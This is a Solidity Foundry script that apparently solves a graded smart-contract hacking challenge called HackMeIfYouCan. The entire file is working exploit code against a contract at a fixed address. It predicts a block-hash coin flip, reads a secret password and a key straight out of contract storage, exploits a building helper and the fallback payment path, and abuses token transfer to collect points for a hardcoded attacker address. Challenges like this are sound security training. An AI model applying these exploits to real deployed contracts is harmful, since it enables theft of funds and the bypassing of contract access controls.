// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/HackMeIfYouCan.sol";
import "../src/BuildingArg.sol";

contract DeployScript is Script {
    HackMeIfYouCan public hackMeContract;
    BuildingArg public building;
    address payable attacker;
    uint256 lastHash;

    function setUp() public {
        attacker = payable(0x368A8eB0f28766a13fB803E0777eb68A25a2080d);
        vm.deal(attacker, 100 ether);
    }

    function run() public {
        bytes32[15] memory data;

        vm.startBroadcast();
        //private key to set

        HackMeIfYouCan hackMeIfYouCan = HackMeIfYouCan(
            payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9)
        );
        building = new BuildingArg();

        console.log("Starting Attack...");
        console.log(
            "Deployed HackMeIfYouCan at address: ",
            address(hackMeIfYouCan)
        );

        //Building
        building.ExploitgoTo(1);

        // Flip
        uint256 FACTOR = 6275657625726723324896521676682367236752985978263786257989175917;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        if (lastHash == blockValue) {
            revert();
        }

        hackMeIfYouCan.flip(guess);

        // Password
        bytes32 password = vm.load(
            address(hackMeIfYouCan),
            bytes32(uint256(3))
        );
        hackMeIfYouCan.sendPassword(password);

        //addPoint
        console.log(address(this));
        console.log(tx.origin);
        hackMeIfYouCan.addPoint();

        // contribute
        hackMeIfYouCan.contribute{value: 0.00001 ether}();
        address(hackMeIfYouCan).call{value: 0.00001 ether}("");

        //Keys
        bytes16 key = bytes16(
            vm.load(address(hackMeIfYouCan), bytes32(uint256(16)))
        );
        hackMeIfYouCan.sendKey(key);
        console.log("Key sent, exploiting sendKey.");

        // transfert
        hackMeIfYouCan.transfer(address(hackMeIfYouCan), 1);
        hackMeIfYouCan.balanceOf(address(this));

        console.log(
            hackMeIfYouCan.getMarks(0x368A8eB0f28766a13fB803E0777eb68A25a2080d)
        );
        vm.stopBroadcast();
    }
}
